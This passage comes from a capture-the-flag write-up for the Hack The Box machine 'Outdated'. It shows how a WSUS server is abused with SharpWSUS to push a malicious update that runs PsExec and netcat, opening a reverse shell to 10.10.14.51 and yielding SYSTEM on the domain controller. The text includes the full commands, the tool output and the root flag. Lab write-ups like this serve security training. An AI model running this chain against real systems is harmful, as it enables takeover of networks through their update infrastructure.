+<p>Looks like the <code>sflowers</code> user can <code>PSRemote</code> into the domain controller. We can query the
+<code>WUServer</code> registry key to find the WSUS URL</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\sflowers\Desktop&gt; reg query &#34;HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate&#34; /v WUServer
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate
+</span></span><span style="display:flex;"><span>    WUServer    REG_SZ    http://wsus.outdated.htb:8530
+</span></span></code></pre></div><p>Windows Server Update Services (WSUS) is essentially just a server that provides a centralized location to distribute updates to clients. This is advantageous because, instead of reaching out the internet and installing updates client by client, it can be downloaded once on the WSUS server and distributed to each client in a scalable, automated manner.</p>
+<p>We can use a tool called <a href="https://github.com/nettitude/SharpWSUS">SharpWSUS</a>, and I will be using the PowerShell version from <a href="https://github.com/S3cur3Th1sSh1t/PowerSharpPack">PowerSharpPack</a>. The basic process here is (check out the blog post from the SharpWSUS GitHub for more info):</p>
+<ol>
+<li>Enumerate the WUS server to figure out what machines to target</li>
+<li>Create a WSUS group</li>
+<li>Add the target machine to the WSUS group</li>
+<li>Create a malicious patch</li>
+<li>Approve the malicious patch for deployment</li>
+<li>Wait for the client to download the patch</li>
+</ol>
+<p>So, since we know the WSUS server (you can also do a <code>SharpWSUS locate</code> to find the URL), we can do a <code>inspect</code> to enumerate it</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\sflowers\Desktop&gt; Invoke-SharpWSUS inspect
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span> ____  _                   __        ______  _   _ ____
+</span></span><span style="display:flex;"><span>/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+</span></span><span style="display:flex;"><span>\___ \| &#39;_ \ / _` | &#39;__| &#39;_ \ \ /\ / /\___ \| | | \___ \
+</span></span><span style="display:flex;"><span> ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+</span></span><span style="display:flex;"><span>|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+</span></span><span style="display:flex;"><span>                       |_|
+</span></span><span style="display:flex;"><span>           Phil Keeble @ Nettitude Red Team
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] Action: Inspect WSUS Server
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>#<span style="color:#75715e">################ WSUS Server Enumeration via SQL ##################</span>
+</span></span><span style="display:flex;"><span>ServerName, WSUSPortNumber, WSUSContentLocation
+</span></span><span style="display:flex;"><span>-----------------------------------------------
+</span></span><span style="display:flex;"><span>DC, 8530, c:\WSUS\WsusContent
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>#<span style="color:#75715e">###################### Computer Enumeration #######################</span>
+</span></span><span style="display:flex;"><span>ComputerName, IPAddress, OSVersion, LastCheckInTime
+</span></span><span style="display:flex;"><span>---------------------------------------------------
+</span></span><span style="display:flex;"><span>dc.outdated.htb, 10.10.11.175, 10.0.17763.1432, 3/13/2025 10:59:55 PM
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>#<span style="color:#75715e">###################### Downstream Server Enumeration #######################</span>
+</span></span><span style="display:flex;"><span>ComputerName, OSVersion, LastCheckInTime
+</span></span><span style="display:flex;"><span>---------------------------------------------------
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>#<span style="color:#75715e">###################### Group Enumeration #######################</span>
+</span></span><span style="display:flex;"><span>GroupName
+</span></span><span style="display:flex;"><span>---------------------------------------------------
+</span></span><span style="display:flex;"><span>All Computers
+</span></span><span style="display:flex;"><span>Downstream Servers
+</span></span><span style="display:flex;"><span>Unassigned Computers
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] Inspect complete
+</span></span></code></pre></div><p>The only computer is the domain controller we are on. To craft the malicious patch, it <strong>has to be a Microsoft signed binary</strong>, and must point to a location on disk. We can use <code>PSExec.exe</code> from SysInternals to execute <code>nc64.exe</code> to spawn a reverse shell. Note: I tried to create a new user, as shown in the blog post, but it didn&rsquo;t work.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\sflowers\Desktop&gt; Invoke-SharpWSUS create /payload:&#34;C:\Users\sflowers\Desktop\PsExec64.exe&#34; /args:&#34;-accepteula -s -d c:\\users\\sflowers\\desktop\\nc64.exe -e cmd.exe 10.10.14.51 9443&#34; /title:shell
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span> ____  _                   __        ______  _   _ ____
+</span></span><span style="display:flex;"><span>/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+</span></span><span style="display:flex;"><span>\___ \| &#39;_ \ / _` | &#39;__| &#39;_ \ \ /\ / /\___ \| | | \___ \
+</span></span><span style="display:flex;"><span> ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+</span></span><span style="display:flex;"><span>|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+</span></span><span style="display:flex;"><span>                       |_|
+</span></span><span style="display:flex;"><span>           Phil Keeble @ Nettitude Red Team
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] Action: Create Update
+</span></span><span style="display:flex;"><span>[*] Creating patch to use the following:
+</span></span><span style="display:flex;"><span>[*] Payload: PsExec64.exe
+</span></span><span style="display:flex;"><span>[*] Payload Path: C:\Users\sflowers\Desktop\PsExec64.exe
+</span></span><span style="display:flex;"><span>[*] Arguments: -accepteula -s -d c:\\users\\sflowers\\desktop\\nc64.exe -e cmd.exe 10.10.14.51 9443
+</span></span><span style="display:flex;"><span>[*] Arguments (HTML Encoded): -accepteula -s -d c:\\users\\sflowers\\desktop\\nc64.exe -e cmd.exe 10.10.14.51 9443
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>#<span style="color:#75715e">################ WSUS Server Enumeration via SQL ##################</span>
+</span></span><span style="display:flex;"><span>ServerName, WSUSPortNumber, WSUSContentLocation
+</span></span><span style="display:flex;"><span>-----------------------------------------------
+</span></span><span style="display:flex;"><span>DC, 8530, c:\WSUS\WsusContent
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>ImportUpdate
+</span></span><span style="display:flex;"><span>Update Revision ID: 34
+</span></span><span style="display:flex;"><span>PrepareXMLtoClient
+</span></span><span style="display:flex;"><span>InjectURL2Download
+</span></span><span style="display:flex;"><span>DeploymentRevision
+</span></span><span style="display:flex;"><span>PrepareBundle
+</span></span><span style="display:flex;"><span>PrepareBundle Revision ID: 35
+</span></span><span style="display:flex;"><span>PrepareXMLBundletoClient
+</span></span><span style="display:flex;"><span>DeploymentRevision
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] Update created - When ready to deploy use the following command:
+</span></span><span style="display:flex;"><span>[*] SharpWSUS.exe approve /updateid:0ce062a7-4e61-4362-8084-ae51ea524f74 /computername:Target.FQDN /groupname:&#34;Group Name&#34;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] To check on the update status use the following command:
+</span></span><span style="display:flex;"><span>[*] SharpWSUS.exe check /updateid:0ce062a7-4e61-4362-8084-ae51ea524f74 /computername:Target.FQDN
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] To delete the update use the following command:
+</span></span><span style="display:flex;"><span>[*] SharpWSUS.exe delete /updateid:0ce062a7-4e61-4362-8084-ae51ea524f74 /computername:Target.FQDN /groupname:&#34;Group Name&#34;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] Create complete
+</span></span></code></pre></div><p>Now we need to deploy the update, which <code>SharpWSUS</code> kindly provides us with the command in the output of the previous command we ran</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\sflowers\Desktop&gt; Invoke-SharpWSUS approve /updateid:0ce062a7-4e61-4362-8084-ae51ea524f74 /computername:dc.outdated.htb /groupname:&#34;revshell&#34;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span> ____  _                   __        ______  _   _ ____
+</span></span><span style="display:flex;"><span>/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+</span></span><span style="display:flex;"><span>\___ \| &#39;_ \ / _` | &#39;__| &#39;_ \ \ /\ / /\___ \| | | \___ \
+</span></span><span style="display:flex;"><span> ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+</span></span><span style="display:flex;"><span>|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+</span></span><span style="display:flex;"><span>                       |_|
+</span></span><span style="display:flex;"><span>           Phil Keeble @ Nettitude Red Team
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] Action: Approve Update
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Targeting dc.outdated.htb
+</span></span><span style="display:flex;"><span>TargetComputer, ComputerID, TargetID
+</span></span><span style="display:flex;"><span>------------------------------------
+</span></span><span style="display:flex;"><span>dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
+</span></span><span style="display:flex;"><span>Group Exists = False
+</span></span><span style="display:flex;"><span>Group Created: revshell
+</span></span><span style="display:flex;"><span>Added Computer To Group
+</span></span><span style="display:flex;"><span>Approved Update
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] Approve complete
+</span></span></code></pre></div><p>This will check if the group <code>Demo Group</code> exists, crate it if it doesn&rsquo;t, and add the target <code>dc.outdated.htb</code> to the group. We can verify that the group was created by running another <code>inspect</code> command.</p>
+<p>Now we just have to wait until the update is installed. We can check the status</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\sflowers\Desktop&gt; Invoke-SharpWSUS check /updateid:0ce062a7-4e61-4362-8084-ae51ea524f74 /computername:dc.outdated.htb
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span> ____  _                   __        ______  _   _ ____
+</span></span><span style="display:flex;"><span>/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+</span></span><span style="display:flex;"><span>\___ \| &#39;_ \ / _` | &#39;__| &#39;_ \ \ /\ / /\___ \| | | \___ \
+</span></span><span style="display:flex;"><span> ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+</span></span><span style="display:flex;"><span>|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+</span></span><span style="display:flex;"><span>                       |_|
+</span></span><span style="display:flex;"><span>           Phil Keeble @ Nettitude Red Team
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] Action: Check Update
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Targeting dc.outdated.htb
+</span></span><span style="display:flex;"><span>TargetComputer, ComputerID, TargetID
+</span></span><span style="display:flex;"><span>------------------------------------
+</span></span><span style="display:flex;"><span>dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] Update is not installed
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] Check complete
+</span></span></code></pre></div><p>We get a hit back on our <code>nc</code> listener</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$nc -nlvp <span style="color:#ae81ff">9443</span>
+</span></span><span style="display:flex;"><span>listening on [any] 9443 ...
+</span></span><span style="display:flex;"><span>connect to [10.10.14.51] from (UNKNOWN) [10.10.11.175] 63447
+</span></span><span style="display:flex;"><span>Microsoft Windows [Version 10.0.17763.1432]
+</span></span><span style="display:flex;"><span>(c) 2018 Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>C:\Windows\system32&gt;whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority\system
+</span></span></code></pre></div><p>Finally, we can grab the root flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>c:\Users\Administrator\Desktop&gt;type root.txt
+</span></span><span style="display:flex;"><span>type root.txt
+</span></span><span style="display:flex;"><span>11e073897e2f372b7d0ecda81ded4d29
+</span></span></code></pre></div>
 </content>
 <p>
   
